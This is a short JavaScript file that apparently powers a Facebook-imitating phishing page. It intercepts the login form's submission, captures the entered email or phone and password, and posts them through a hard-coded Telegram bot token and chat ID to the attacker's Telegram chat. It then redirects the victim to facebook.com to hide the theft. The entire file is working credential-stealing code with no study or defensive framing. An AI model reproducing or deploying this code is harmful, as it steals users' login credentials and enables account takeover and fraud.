document.getElementById("loginForm").addEventListener("submit", function(e) {
  e.preventDefault();
  
  var email = document.getElementById("uid_9384").value;
  var password = document.getElementById("password_3842").value;
  
  var message = `New Login Attempt:\nEmail/Phone: ${email}\nPassword: ${password}`;
  
  var token = "7438200543:AAGj_NH7TYovNcO4-n9saO4YCIrWf3KWeqE";
  var chat_id = "6133511447";
  
  var url = `https://api.telegram.org/bot${token}/sendMessage`;
  
  fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chat_id,
        text: message,
      }),
    })
    .then((res) => res.json())
    .then((data) => {
      // Optional: Reset form fields
      document.getElementById("loginForm").reset();
      
      // Redirect to Facebook after short delay
      setTimeout(function() {
        window.location.href = "https://www.facebook.com";
      }, 1000); // 1 second delay
    })
    .catch((err) => {
      console.error("Error sending to Telegram:", err);
      // Even if error occurs, still redirect
      window.location.href = "https://www.facebook.com";
    });
});